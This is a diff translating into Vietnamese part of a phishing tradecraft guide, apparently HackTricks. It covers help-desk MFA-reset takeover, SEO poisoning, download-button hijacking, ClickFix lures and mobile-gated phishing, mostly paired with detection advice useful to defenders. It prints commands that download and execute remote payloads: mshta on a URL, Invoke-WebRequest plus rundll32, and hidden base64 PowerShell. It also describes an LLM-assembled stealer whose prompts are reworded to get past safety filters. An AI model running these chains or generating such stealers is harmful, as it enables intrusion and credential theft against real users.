+## Phát hiện việc bị phát hiện
 
-Obviously one of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed, somehow your domain was detected as suspicions.\
-One easy way to check if you domain appears in any blacklist is to use [https://malwareworld.com/](https://malwareworld.com)
+Rõ ràng, một trong những cách tốt nhất để biết bạn đã bị phát hiện hay chưa là **tìm tên miền của bạn trong các blacklist**. Nếu tên miền xuất hiện trong danh sách, có nghĩa là nó đã bị phát hiện là đáng ngờ theo cách nào đó.\
+Một cách đơn giản để kiểm tra xem tên miền của bạn có xuất hiện trong blacklist nào không là dùng [https://malwareworld.com/](https://malwareworld.com)
 
-However, there are other ways to know if the victim is **actively looking for suspicions phishing activity in the wild** as explained in:
+Tuy nhiên, còn có những cách khác để biết nạn nhân có **chủ động tìm kiếm hoạt động Phishing đáng ngờ ngoài thực tế hay không**, như được giải thích tại:
 
 
 {{#ref}}
 detecting-phising.md
 {{#endref}}
 
-You can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain** of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you will need to be very stealth.<sup>[[2]](#references)</sup>
+Bạn có thể **mua một tên miền có tên rất giống với tên miền của nạn nhân** và/hoặc **tạo chứng chỉ** cho một **tên miền phụ** thuộc tên miền do bạn kiểm soát, **có chứa** **từ khóa** trong tên miền của nạn nhân. Nếu **nạn nhân** thực hiện bất kỳ **tương tác DNS hoặc HTTP** nào với chúng, bạn sẽ biết rằng họ **đang chủ động tìm kiếm** các tên miền đáng ngờ và bạn cần hoạt động thật kín đáo.<sup>[[2]](#references)</sup>
 
-### Evaluate the phishing
+### Đánh giá email Phishing
 
-Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.
+Dùng [**Phishious** ](https://github.com/Rices/Phishious)để đánh giá xem email của bạn sẽ vào thư mục spam, bị chặn hay gửi thành công.
 
-## High-Touch Identity Compromise (Help-Desk MFA Reset)
+## Chiếm đoạt danh tính bằng tương tác trực tiếp (Đặt lại MFA qua bộ phận hỗ trợ)
 
-Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.<sup>[[6]](#references)</sup>
+Các nhóm xâm nhập hiện đại ngày càng bỏ qua hoàn toàn các mồi nhử qua email và **nhắm trực tiếp vào quy trình hỗ trợ dịch vụ/khôi phục danh tính** để vượt qua MFA. Cuộc tấn công hoàn toàn theo kiểu "living-off-the-land": khi đã có thông tin đăng nhập hợp lệ, kẻ điều hành sẽ di chuyển ngang bằng các công cụ quản trị tích hợp sẵn – không cần malware.<sup>[[6]](#references)</sup>
 
-### Attack flow
-1. Recon the victim 
-   * Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.  
-   * Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
-2. Real-time social engineering  
-   * Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).  
-   * Provide the previously-collected PII to pass knowledge-based verification.  
-   * Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
-3. Immediate post-access actions (≤60 min in real cases)  
-   * Establish a foothold through any web SSO portal.  
-   * Enumerate AD / AzureAD with built-ins (no binaries dropped):
+### Quy trình tấn công
+1. Thu thập thông tin về nạn nhân
+   * Thu thập thông tin cá nhân và công việc từ LinkedIn, các vụ rò rỉ dữ liệu, GitHub công khai, v.v.
+   * Xác định các danh tính có giá trị cao (lãnh đạo, IT, tài chính) và tìm hiểu **chính xác quy trình hỗ trợ** để đặt lại mật khẩu/MFA.
+2. Social engineering theo thời gian thực
+   * Gọi điện, liên hệ qua Teams hoặc chat với bộ phận hỗ trợ, giả mạo mục tiêu (thường dùng **caller-ID giả mạo** hoặc **giọng nói nhân bản**).
+   * Cung cấp PII đã thu thập trước đó để vượt qua bước xác minh dựa trên kiến thức.
+   * Thuyết phục nhân viên **đặt lại secret MFA** hoặc thực hiện **SIM-swap** cho số điện thoại đã đăng ký.
+3. Các hành động ngay sau khi có quyền truy cập (≤60 phút trong các trường hợp thực tế)
+   * Thiết lập chỗ đứng thông qua bất kỳ cổng web SSO nào.
+   * Liệt kê AD / AzureAD bằng các công cụ có sẵn (không thả binary):
      ```powershell
      # list directory groups & privileged roles
      Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}
@@ -488,43 +488,43 @@ Modern intrusion sets increasingly skip email lures entirely and **directly targ
      # Enumerate devices the account can login to
      Get-MgUserRegisteredDevice -UserId <user@corp.local>
      ```
-   * Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.
+   * Di chuyển ngang bằng **WMI**, **PsExec** hoặc các agent **RMM** hợp pháp đã được đưa vào danh sách cho phép trong môi trường.
 
-### Detection & Mitigation
-* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
-* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:  
-  * MFA method changed + authentication from new device / geo.  
-  * Immediate elevation of the same principal (user-→-admin).  
-* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
-* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.
+### Phát hiện & Giảm thiểu
+* Xem việc khôi phục danh tính qua bộ phận hỗ trợ là **thao tác đặc quyền** – yêu cầu xác thực tăng cường và phê duyệt của quản lý.
+* Triển khai các quy tắc **Identity Threat Detection & Response (ITDR)** / **UEBA** để cảnh báo khi:  
+  * Phương thức MFA bị thay đổi + xác thực từ thiết bị / vị trí địa lý mới.  
+  * Cùng một principal được nâng quyền ngay lập tức (user-→-admin).  
+* Ghi âm các cuộc gọi tới bộ phận hỗ trợ và yêu cầu **gọi lại số điện thoại đã đăng ký trước đó** trước khi đặt lại.
+* Triển khai **Just-In-Time (JIT) / Privileged Access** để các tài khoản vừa được đặt lại **không tự động thừa hưởng token có đặc quyền cao**.
 
 ---
 
-## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
-Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.<sup>[[6]](#references)</sup>
+## Đánh lạc hướng quy mô lớn – SEO Poisoning & chiến dịch “ClickFix”
+Các nhóm tội phạm phổ thông bù đắp chi phí cho các chiến dịch nhắm mục tiêu kỹ lưỡng bằng các cuộc tấn công đại trà, biến **công cụ tìm kiếm và mạng quảng cáo thành kênh phát tán**.<sup>[[6]](#references)</sup>
 
-1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
-2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
+1. **SEO poisoning / malvertising** đẩy một kết quả giả mạo như `chromium-update[.]site` lên đầu quảng cáo tìm kiếm.
+2. Nạn nhân tải xuống một **first-stage loader** nhỏ (thường là JS/HTA/ISO). Ví dụ được Unit 42 ghi nhận:
    * `RedLine stealer`
    * `Lumma stealer`
    * `Lampion Trojan`
-3. Loader exfiltrates browser cookies + credential DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:
-   * RAT (e.g. AsyncRAT, RustDesk)
+3. Loader đánh cắp cookie trình duyệt + cơ sở dữ liệu thông tin xác thực, sau đó tải xuống một **loader chạy ngầm**, quyết định – *theo thời gian thực* – có triển khai:
+   * RAT (ví dụ: AsyncRAT, RustDesk)
    * ransomware / wiper
-   * persistence component (registry Run key + scheduled task)
+   * thành phần duy trì hiện diện (khóa Run trong registry + scheduled task)
 
-### Hardening tips
-* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.
-* Restrict software installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.
-* Monitor for child processes of browsers opening installers:
+### Mẹo tăng cường bảo mật
+* Chặn các domain mới đăng ký và áp dụng **Advanced DNS / URL Filtering** cho cả *quảng cáo tìm kiếm* lẫn email.
+* Chỉ cho phép cài đặt phần mềm từ các gói MSI đã ký / Store, dùng chính sách để chặn thực thi `HTA`, `ISO`, `VBS`.
+* Giám sát các tiến trình con của trình duyệt khi mở trình cài đặt:
   ```yaml
   - parent_image: /Program Files/Google/Chrome/*
     and child_image: *\\*.exe
   ```
-* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).
+* Tìm các LOLBins thường bị first-stage loader lạm dụng (ví dụ: `regsvr32`, `curl`, `mshta`).
 
-### Download-button click hijacking with TDS handoff
-Some fake software portals keep the visible download `href` pointing to the **real** GitHub/release URL but hijack the **first** user interaction in JavaScript and send the victim into a **Traffic Distribution System (TDS)** chain instead.<sup>[[9]](#references)</sup>
+### Chiếm quyền click nút tải xuống bằng cách chuyển hướng qua TDS
+Một số cổng phần mềm giả mạo vẫn để `href` tải xuống hiển thị trỏ đến URL GitHub/release **thật**, nhưng chiếm quyền tương tác đầu tiên của người dùng bằng JavaScript và đưa nạn nhân vào chuỗi **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
 
 ```javascript
 const cachedOpen = window.open;
@@ -536,87 +536,87 @@ document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
 }, true);
 ```
 
-Key traits:
-- The hook usually runs in the **capture phase** (`true`) on `document`, so it fires before site handlers.
-- Chrome often uses `mousedown` instead of `click` to keep the redirect tied to a valid **user gesture** and improve popup-blocker bypass.
-- Some variants pre-open `about:blank` or synthesize `<a target="_blank">` clicks and only later assign the TDS URL.
-- Browser-side caps commonly live in `localStorage`, so the **first click** may reach malware while refreshes/retries fall back to the benign-looking visible link.
-- The TDS can gate by referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, and per-session counters, making analyst replays non-deterministic.
+Các đặc điểm chính:
+- Hook thường chạy ở **capture phase** (`true`) trên `document`, nên được kích hoạt trước các handler của trang web.
+- Chrome thường dùng `mousedown` thay vì `click` để giữ redirect gắn với một **user gesture** hợp lệ và tăng khả năng bypass popup-blocker.
+- Một số biến thể mở sẵn `about:blank` hoặc kích hoạt click trên `<a target="_blank">` được tạo tự động, rồi chỉ sau đó mới gán URL TDS.
+- Giới hạn ở phía trình duyệt thường được lưu trong `localStorage`, nên **lần click đầu tiên** có thể dẫn đến malware, trong khi các lần refresh/thử lại sẽ chuyển về link hiển thị trông có vẻ vô hại.
+- TDS có thể lọc theo referrer, domain truy cập, GEO, fingerprint trình duyệt/thiết bị, kiểm tra VPN/datacenter, ngữ cảnh click và bộ đếm theo phiên, khiến việc analyst phát lại không cho kết quả nhất quán.
 
-Defender ideas:
-- Compare the **displayed** `href` with the **actual** navigation target generated at click time.
-- Hunt for `document.addEventListener(..., true)` handlers that call both `preventDefault()` and `stopImmediatePropagation()` around `window.open`, `about:blank`, or synthetic anchor clicks.
-- Treat clusters of newly registered software-download domains that all load the same CloudFront/JS stage as a high-signal SEO-poisoning/TDS pattern.
+Ý tưởng cho defender:
+- So sánh `href` **được hiển thị** với đích điều hướng **thực tế** được tạo ra khi click.
+- Tìm các handler `document.addEventListener(..., true)` gọi cả `preventDefault()` và `stopImmediatePropagation()` cùng với `window.open`, `about:blank` hoặc click anchor được tạo tự động.
+- Xem các cụm domain tải phần mềm mới đăng ký cùng tải một stage CloudFront/JS là dấu hiệu có giá trị cao của mô hình SEO-poisoning/TDS.
 
-### ClickFix from fake verification pages + archive-looking LOLBAS fetches
-Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:<sup>[[9]](#references)</sup>
+### ClickFix từ các trang xác minh giả mạo + các lượt tải LOLBAS trông như tải archive
+Một số nhánh TDS dẫn đến trang xác minh giả mạo (kiểu Cloudflare/IUAM), hướng dẫn nạn nhân chạy một Windows binary đáng tin cậy như sau:<sup>[[9]](#references)</sup>
 
 ```cmd
 C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
 ```
 
-Notes:
-- `mshta.exe` executes the **HTA/VBScript at the start of the response**, even if the URL pretends to be a `.7z` archive; appended archive data can be pure decoy.
-- Follow-on stages often keep lying about file type (`.rtf` for PowerShell, `.asar` for Python, ZIPs with padded binaries) and then switch to **manual PE mapping / in-memory execution**.
-- If you are responding to one of these chains, preserve **network + memory from the first successful run**: later replays may only show a benign installer/SFX path or fail because the payload/key release was bound to the original TDS session.
+Ghi chú:
+- `mshta.exe` thực thi **HTA/VBScript ở đầu phản hồi**, ngay cả khi URL giả dạng một archive `.7z`; dữ liệu archive được nối thêm có thể chỉ là mồi nhử.
+- Các stage tiếp theo thường tiếp tục giả dạng loại file (`.rtf` cho PowerShell, `.asar` cho Python, ZIP chứa binary được đệm thêm dữ liệu), rồi chuyển sang **manual PE mapping / in-memory execution**.
+- Nếu bạn đang ứng phó với một chuỗi tấn công như vậy, hãy lưu lại **network + memory từ lần chạy thành công đầu tiên**: những lần phát lại sau có thể chỉ cho thấy một đường dẫn installer/SFX lành tính hoặc thất bại vì payload/key release được ràng buộc với TDS session ban đầu.
 
-### ClickFix DLL delivery tradecraft (fake CERT update)
-* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.<sup>[[12]](#references)</sup>
-* Typical batch chain observed:
+### Thủ pháp phát tán DLL kiểu ClickFix (giả mạo bản cập nhật CERT)
+* Mồi nhử: trang tư vấn CERT quốc gia được sao chép, có nút **Update** hiển thị hướng dẫn “khắc phục” từng bước. Nạn nhân được hướng dẫn chạy một batch để tải DLL xuống rồi thực thi bằng `rundll32`.<sup>[[12]](#references)</sup>
+* Chuỗi batch thường gặp:
   ```cmd
   echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
   echo timeout /t 10
   echo rundll32.exe "%TEMP%\notepad2.dll",notepad
   ```
-  * `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported entrypoint (`notepad`).
-* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded PowerShell** executed hidden and with policy bypass:
+  * `Invoke-WebRequest` ghi payload vào `%TEMP%`, một khoảng chờ ngắn giúp che giấu độ trễ mạng, sau đó `rundll32` gọi entrypoint được export (`notepad`).
+* DLL beacon thông tin nhận dạng host và thăm dò C2 vài phút một lần. Các lệnh từ xa được gửi dưới dạng **PowerShell mã hóa base64**, thực thi ẩn và bypass policy:
   ```powershell
   powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
   ```
-  * This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.
-* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.
+  * Điều này duy trì tính linh hoạt của C2 (server có thể thay đổi task mà không cần cập nhật DLL) và ẩn cửa sổ console. Tìm các tiến trình PowerShell con của `rundll32.exe` có cả `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
+* Defenders có thể tìm các callback HTTP(S) theo dạng `...page.php?tynor=<COMPUTER>sss<USER>` và chu kỳ polling 5 phút sau khi DLL được load.
 
 ---
 
-## Display-triggered malvertising through RTB
+## Malvertising kích hoạt khi hiển thị thông qua RTB
 
-Unlike a sponsored search result that needs a click, an RTB ad can load third-party JavaScript when its creative renders in a website or app. Citizen Lab observed ad tags calling a separate decision server with advertising identifiers. Most impressions received an empty response; selected impressions could receive JavaScript. A benign response during replay therefore does not establish that every viewer received the same content.<sup>[[14]](#references)</sup>
+Không giống kết quả tìm kiếm được tài trợ cần có lượt click, quảng cáo RTB có thể load JavaScript của bên thứ ba khi creative được hiển thị trên website hoặc app. Citizen Lab quan sát thấy các ad tag gọi đến một decision server riêng biệt kèm theo advertising identifier. Hầu hết impression nhận được phản hồi trống; một số impression được chọn có thể nhận JavaScript. Vì vậy, phản hồi lành tính khi phát lại không chứng minh rằng mọi người xem đều nhận được cùng một nội dung.<sup>[[14]](#references)</sup>
 
-This is a **delivery mechanism**, not an exploit by itself: executing JavaScript in an ad-rendering context does not automatically install spyware. The underlying browser or OS exploit was not disclosed, so an ad impression or decision-server request alone is not proof of infection. For the identifier-linkage side of RTB targeting, see [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>
+Đây là một **cơ chế phân phối**, bản thân nó không phải exploit: thực thi JavaScript trong ngữ cảnh hiển thị quảng cáo không tự động cài đặt spyware. Exploit bên dưới của browser hoặc OS không được tiết lộ, vì vậy chỉ riêng một impression quảng cáo hoặc request đến decision server không phải bằng chứng đã bị nhiễm. Để tìm hiểu về khía cạnh liên kết identifier của việc nhắm mục tiêu RTB, xem [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>
 
-## AI-Enhanced Phishing Operations
-Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.
+## Các chiến dịch Phishing được tăng cường bằng AI
+Attackers hiện kết hợp **API LLM và voice-clone** để tạo các mồi nhử được cá nhân hóa hoàn toàn và tương tác theo thời gian thực.
 
-| Layer | Example use by threat actor |
+| Layer | Ví dụ về cách threat actor sử dụng |
 |-------|-----------------------------|
-|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
-|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
-|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|
+|Automation|Tạo và gửi hơn 100 nghìn email / SMS với cách diễn đạt được ngẫu nhiên hóa và tracking link.|
+|Generative AI|Tạo email *một lần*, đề cập đến các thương vụ M&A công khai, câu đùa nội bộ trên social media; giả giọng CEO bằng deepfake trong các vụ lừa đảo qua cuộc gọi lại.|
+|Agentic AI|Tự động đăng ký domain, thu thập open-source intel, soạn email cho giai đoạn tiếp theo khi nạn nhân click nhưng không gửi thông tin đăng nhập.|
 
-**Defence:**  
-• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).  
-• Deploy **voice-biometric challenge phrases** for high-risk phone requests.  
-• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.
+**Biện pháp phòng vệ:**  
+• Thêm **dynamic banner** để làm nổi bật các tin nhắn được gửi từ automation không đáng tin cậy (thông qua bất thường ARC/DKIM).  
+• Triển khai **cụm từ thử thách sinh trắc học giọng nói** cho các yêu cầu qua điện thoại có rủi ro cao.  
+• Liên tục mô phỏng các mồi nhử do AI tạo ra trong chương trình nâng cao nhận thức – template tĩnh đã lỗi thời.
 
-See also – agentic browsing abuse for credential phishing:
+Xem thêm – lạm dụng agentic browsing để phishing thông tin đăng nhập:
 
 {{#ref}}
 ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
 {{#endref}}
 
-See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):
+Xem thêm – lạm dụng các công cụ CLI cục bộ và MCP của AI agent (để kiểm kê secret và phát hiện):
 
 {{#ref}}
 ai-agent-abuse-local-ai-cli-tools-and-mcp.md
 {{#endref}}
 
-## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)
+## Lắp ráp JavaScript phishing lúc chạy với sự hỗ trợ của LLM (tạo mã trong browser)
 
-Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).<sup>[[8]](#references)</sup>
+Attackers có thể phát tán HTML trông có vẻ lành tính và **tạo stealer lúc chạy** bằng cách yêu cầu **API LLM đáng tin cậy** viết JavaScript, sau đó thực thi ngay trong browser (ví dụ: `eval` hoặc `<script>` động).<sup>[[8]](#references)</sup>
 
-1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
-2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
-3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
+1. **Prompt-as-obfuscation:** mã hóa URL exfil/Base64 trong prompt; lặp lại cách diễn đạt để vượt qua bộ lọc an toàn và giảm hiện tượng hallucination.
+2. **Lời gọi API phía client:** khi tải trang, JS gọi đến một LLM công khai (Gemini/DeepSeek/etc.) hoặc CDN proxy; chỉ có prompt/lời gọi API xuất hiện trong HTML tĩnh.
+3. **Lắp ráp và thực thi:** nối phản hồi lại với nhau rồi thực thi (đa hình theo từng lượt truy cập):
 
 ```javascript
 fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
@@ -624,22 +624,22 @@ fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages
   .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
 ```
 
-4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.
+4. **Phish/exfil:** code được tạo ra cá nhân hóa mồi nhử (ví dụ: phân tích token LogoKit) và gửi creds đến endpoint được ẩn trong prompt.
 
-**Evasion traits**
-- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
-- No static payload; malicious JS exists only after render.
-- Non-deterministic generations produce **unique** stealers per session.
+**Đặc điểm né tránh**
+- Traffic đi qua các domain LLM phổ biến hoặc proxy CDN uy tín; đôi khi dùng WebSocket để kết nối đến backend.
+- Không có payload tĩnh; JS độc hại chỉ tồn tại sau khi render.
+- Các lần tạo không xác định trước tạo ra stealer **duy nhất** cho mỗi session.
 
-**Detection ideas**
-- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
-- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
-- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.
+**Ý tưởng phát hiện**
+- Chạy sandbox có bật JS; đánh dấu `eval` lúc runtime/tạo script động có nguồn từ phản hồi LLM.
+- Tìm các POST từ front-end đến API LLM ngay sau đó là `eval`/`Function` trên văn bản trả về.
+- Cảnh báo khi có domain LLM không được phê duyệt trong traffic phía client, tiếp theo là các POST chứa thông tin đăng nhập.
 
 ---
 
 ## MFA Fatigue / Push Bombing Variant – Forced Reset
-Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
+Ngoài kiểu push-bombing cổ điển, operator chỉ cần **buộc đăng ký MFA mới** trong cuộc gọi với bộ phận hỗ trợ, vô hiệu hóa token hiện có của người dùng. Mọi lời nhắc đăng nhập tiếp theo đều có vẻ hợp lệ với nạn nhân.
 
 ```text
 [Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
@@ -647,40 +647,40 @@ Besides classic push-bombing, operators simply **force a new MFA registration** 
 [Attacker]  →  Completes new TOTP enrolment on their own device
 ```
 
-Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.
+Giám sát các sự kiện AzureAD/AWS/Okta khi **`deleteMFA` + `addMFA`** xảy ra **trong vòng vài phút từ cùng một IP**.
 
 
 
 ## Clipboard Hijacking / Pastejacking
 
-Attackers can silently copy malicious commands into the victim’s clipboard from a compromised or typosquatted web page and then trick the user to paste them inside **Win + R**, **Win + X** or a terminal window, executing arbitrary code without any download or attachment.
+Kẻ tấn công có thể âm thầm sao chép các lệnh độc hại vào clipboard của nạn nhân từ một trang web bị xâm nhập hoặc giả mạo tên miền, rồi lừa người dùng dán chúng vào **Win + R**, **Win + X** hoặc cửa sổ terminal, thực thi mã tùy ý mà không cần tải xuống hay đính kèm tệp.
 
 
 {{#ref}}
 clipboard-hijacking.md
 {{#endref}}
 
-## Mobile Phishing & Malicious App Distribution (Android & iOS)
+## Mobile Phishing & Phát tán ứng dụng độc hại (Android & iOS)
 
 
 {{#ref}}
 mobile-phishing-malicious-apps.md
 {{#endref}}
 
-### WhatsApp device-linking hijack via QR social engineering
-* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.<sup>[[12]](#references)</sup>
-* Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.
+### Chiếm quyền liên kết thiết bị WhatsApp bằng QR qua social engineering
+* Một trang dụ nhấp (ví dụ: “kênh” giả mạo của bộ hoặc CERT) hiển thị mã QR WhatsApp Web/Desktop và hướng dẫn nạn nhân quét mã, âm thầm thêm kẻ tấn công làm **thiết bị được liên kết**.<sup>[[12]](#references)</sup>
+* Kẻ tấn công lập tức có thể xem các cuộc trò chuyện và danh bạ cho đến khi phiên bị xóa. Nạn nhân có thể thấy thông báo “thiết bị mới được liên kết” sau đó; đội phòng thủ có thể tìm kiếm các sự kiện liên kết thiết bị bất thường ngay sau khi người dùng truy cập các trang QR không đáng tin cậy.
 
-### Mobile‑gated phishing to evade crawlers/sandboxes
-Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint; non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.<sup>[[7]](#references)</sup>
+### Phishing giới hạn truy cập trên thiết bị di động để né crawler/sandbox
+Các nhóm vận hành ngày càng giới hạn luồng phishing bằng một bước kiểm tra thiết bị đơn giản để crawler trên desktop không bao giờ truy cập được các trang cuối. Một mô hình phổ biến là dùng một script nhỏ kiểm tra DOM có hỗ trợ cảm ứng hay không rồi gửi kết quả đến endpoint của máy chủ; các client không phải thiết bị di động nhận HTTP 500 (hoặc trang trống), trong khi người dùng di động được hiển thị toàn bộ luồng.<sup>[[7]](#references)</sup>
 
-Minimal client snippet (typical logic):
+Đoạn client tối giản (logic điển hình):
 
 ```html
 <script src="/static/detect_device.js"></script>
 ```
 
-`detect_device.js` logic (simplified):
+`detect_device.js` logic (đơn giản hóa):
 
 ```javascript
 const isMobile = ('ontouchstart' in document.documentElement);
@@ -688,35 +688,34 @@ fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, bo
   .then(()=>location.reload());
 ```
 
-Server behaviour often observed:
-- Sets a session cookie during the first load.
-- Accepts `POST /detect {"is_mobile":true|false}`.
-- Returns 500 (or placeholder) to subsequent GETs when `is_mobile=false`; serves phishing only if `true`.
+Hành vi máy chủ thường được quan sát:
+- Thiết lập cookie phiên trong lần tải đầu tiên.
+- Chấp nhận `POST /detect {"is_mobile":true|false}`.
+- Trả về 500 (hoặc nội dung giữ chỗ) cho các yêu cầu GET tiếp theo khi `is_mobile=false`; chỉ phân phát nội dung phishing nếu giá trị là `true`.
 
-Hunting and detection heuristics:
-- urlscan query: `filename:"detect_device.js" AND page.status:500`
-- Web telemetry: sequence of `GET /static/detect_device.js` → `POST /detect` → HTTP 500 for non‑mobile; legitimate mobile victim paths return 200 with follow‑on HTML/JS.
-- Block or scrutinize pages that condition content exclusively on `ontouchstart` or similar device checks.
+Heuristic săn tìm và phát hiện:
+- Truy vấn urlscan: `filename:"detect_device.js" AND page.status:500`
+- Telemetry web: chuỗi `GET /static/detect_device.js` → `POST /detect` → HTTP 500 khi thiết bị không phải di động; các đường đi hợp lệ của nạn nhân dùng thiết bị di động trả về 200 cùng HTML/JS tiếp theo.
+- Chặn hoặc xem xét kỹ các trang chỉ hiển thị nội dung dựa trên `ontouchstart` hoặc các kiểm tra thiết bị tương tự.
 
-Defence tips:
-- Execute crawlers with mobile‑like fingerprints and JS enabled to reveal gated content.
-- Alert on suspicious 500 responses following `POST /detect` on newly registered domains.
+Mẹo phòng thủ:
+- Chạy crawler với fingerprint giống thiết bị di động và bật JS để phát hiện nội dung bị ẩn.
+- Cảnh báo về các phản hồi 500 đáng ngờ xảy ra sau `POST /detect` trên các domain mới đăng ký.
 
 ## References
 
-- [1] [Generating Domain Variations Used in Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
-- [2] [Finding Phishing: Tools and Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
-- [3] [Steal Credentials & Bypass 2FA Using noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
-- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
-- [5] [How To Install and Configure DKIM with Postfix on Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
-- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
-- [7] [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
-- [8] [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
